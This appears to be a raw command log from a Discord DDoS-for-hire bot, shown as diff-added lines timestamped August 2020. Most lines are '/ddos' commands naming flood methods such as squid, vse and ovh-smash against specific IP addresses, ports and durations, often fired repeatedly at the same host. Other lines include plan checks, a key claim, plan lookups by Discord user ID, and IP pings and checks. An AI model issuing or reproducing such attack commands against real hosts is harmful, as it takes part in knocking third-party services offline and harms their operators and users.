+[Sun Aug 02 2020 22:21:04 GMT-1100 (Samoa Standard Time)] /restart
+[Mon Aug 03 2020 02:54:06 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 188.212.102.241 120 3389
+[Mon Aug 03 2020 02:55:20 GMT-1100 (Samoa Standard Time)] /ddos kraken udpplain 188.212.102.241 120 3389
+[Mon Aug 03 2020 02:55:48 GMT-1100 (Samoa Standard Time)] /ddos kraken vse 188.212.102.241 120 3389
+[Mon Aug 03 2020 02:56:05 GMT-1100 (Samoa Standard Time)] /ddos godzilla vse 188.212.102.241 120 3389
+[Mon Aug 03 2020 03:08:53 GMT-1100 (Samoa Standard Time)] /ddos godzilla vse 188.212.102.241 120 3389
+[Mon Aug 03 2020 03:09:40 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 188.212.102.241 120 3389
+[Mon Aug 03 2020 12:49:08 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 20 21
+[Mon Aug 03 2020 12:50:38 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 13:03:06 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 13:03:28 GMT-1100 (Samoa Standard Time)] /ddos godzilla vse 101.71.138.9 20 80
+[Mon Aug 03 2020 13:05:45 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 13:05:51 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 13:05:54 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 13:05:55 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 13:05:58 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 13:05:58 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 13:05:58 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 13:08:01 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 13:08:12 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 13:08:27 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 13:09:18 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 13:11:38 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 13:13:14 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 13:16:57 GMT-1100 (Samoa Standard Time)] /plan
+[Mon Aug 03 2020 13:19:09 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 13:19:18 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 13:19:21 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 13:19:21 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 13:24:21 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 14:00:37 GMT-1100 (Samoa Standard Time)] /ddos kraken ovh-smash 158.69.156.168
+[Mon Aug 03 2020 14:00:53 GMT-1100 (Samoa Standard Time)] /ddos kraken ovh-smash 158.69.156.168 120 80
+[Mon Aug 03 2020 14:02:26 GMT-1100 (Samoa Standard Time)] /ddos kraken ovh-smash 158.69.156.168 120 80
+[Mon Aug 03 2020 14:29:21 GMT-1100 (Samoa Standard Time)] /sorry
+[Mon Aug 03 2020 14:33:40 GMT-1100 (Samoa Standard Time)] /plan
+[Mon Aug 03 2020 14:33:46 GMT-1100 (Samoa Standard Time)] /ddos kraken
+[Mon Aug 03 2020 14:34:01 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 1.1.1.1 80 80
+[Mon Aug 03 2020 14:34:02 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 1.1.1.1 80 80
+[Mon Aug 03 2020 14:34:04 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 1.1.1.1 80 80
+[Mon Aug 03 2020 14:34:04 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 1.1.1.1 80 80
+[Mon Aug 03 2020 14:53:32 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 14:53:36 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 14:53:36 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 14:53:36 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 14:53:36 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 14:53:36 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80/ddos kraken squid 101.71.138.9 30 80/ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 14:53:36 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 14:53:36 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 14:53:36 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 14:53:36 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 14:53:59 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 14:53:59 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80/ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 14:53:59 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 14:53:59 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 14:53:59 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 14:53:59 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 14:53:59 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 14:53:59 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 14:53:59 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 14:53:59 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 15:15:42 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.71.138.9 30 80
+[Mon Aug 03 2020 15:38:11 GMT-1100 (Samoa Standard Time)] /plan
+[Mon Aug 03 2020 15:39:46 GMT-1100 (Samoa Standard Time)] /clain V
+[Mon Aug 03 2020 15:39:50 GMT-1100 (Samoa Standard Time)] /claim TRwym0uCma6b6kODKJit5cyIN2ITybT88dI5cw8zAnOgoNKJ24
+[Mon Aug 03 2020 15:40:15 GMT-1100 (Samoa Standard Time)] /plan
+[Mon Aug 03 2020 15:41:19 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 103.95.221.2 30 80
+[Mon Aug 03 2020 15:43:17 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 103.95.221.188 40 80
+[Mon Aug 03 2020 15:45:12 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 103.95.221.188 40 80
+[Mon Aug 03 2020 15:47:53 GMT-1100 (Samoa Standard Time)] /plan
+[Mon Aug 03 2020 21:19:28 GMT-1100 (Samoa Standard Time)] /ddos kraken ovh-smash 158.69.156.168 30 22
+[Wed Aug 05 2020 13:23:08 GMT-1100 (Samoa Standard Time)] /plan
+[Wed Aug 05 2020 13:23:23 GMT-1100 (Samoa Standard Time)] /
+[Wed Aug 05 2020 13:23:39 GMT-1100 (Samoa Standard Time)] /sms
+[Wed Aug 05 2020 13:23:47 GMT-1100 (Samoa Standard Time)] /lag
+[Wed Aug 05 2020 13:23:55 GMT-1100 (Samoa Standard Time)] /methods
+[Wed Aug 05 2020 13:24:08 GMT-1100 (Samoa Standard Time)] /accounts
+[Mon Aug 17 2020 12:06:22 GMT-1100 (Samoa Standard Time)] /ddos kraken ovh kill 167.114.53.155 120
+[Mon Aug 17 2020 12:06:37 GMT-1100 (Samoa Standard Time)] /ddoss kraken ovh-smash 167.114.53.155 120
+[Mon Aug 17 2020 12:06:49 GMT-1100 (Samoa Standard Time)] /ddos kraken ovh-smash 167.114.53.155 120
+[Tue Aug 18 2020 06:28:53 GMT-1100 (Samoa Standard Time)] /getplan <@551499467929681920>
+[Tue Aug 18 2020 06:29:06 GMT-1100 (Samoa Standard Time)] /plan
+[Wed Aug 19 2020 09:57:12 GMT-1100 (Samoa Standard Time)] /getplan <@220662601082863616>
+[Wed Aug 19 2020 10:58:19 GMT-1100 (Samoa Standard Time)] /getplan <@510553001249996810>
+[Fri Aug 21 2020 09:12:05 GMT-1100 (Samoa Standard Time)] /plan
+[Fri Aug 21 2020 09:22:43 GMT-1100 (Samoa Standard Time)] /ping 158.69.156.169
+[Sun Aug 23 2020 11:46:28 GMT-1100 (Samoa Standard Time)] /getplan <@609725906637815814>
+[Sun Aug 23 2020 11:46:41 GMT-1100 (Samoa Standard Time)] /getplan <@609725906637815814>
+[Tue Aug 25 2020 15:18:19 GMT-1100 (Samoa Standard Time)] /ping 1.1.1.1
+[Thu Aug 27 2020 03:22:53 GMT-1100 (Samoa Standard Time)] /ping 173.66.90.157
+[Thu Aug 27 2020 03:23:17 GMT-1100 (Samoa Standard Time)] /
+[Thu Aug 27 2020 03:23:25 GMT-1100 (Samoa Standard Time)] /ip
+[Thu Aug 27 2020 03:23:34 GMT-1100 (Samoa Standard Time)] /tr3p
+[Thu Aug 27 2020 03:23:37 GMT-1100 (Samoa Standard Time)] /tr4p
+[Thu Aug 27 2020 03:24:16 GMT-1100 (Samoa Standard Time)] /
+[Thu Aug 27 2020 03:24:52 GMT-1100 (Samoa Standard Time)] /checkip 173.66.90.157
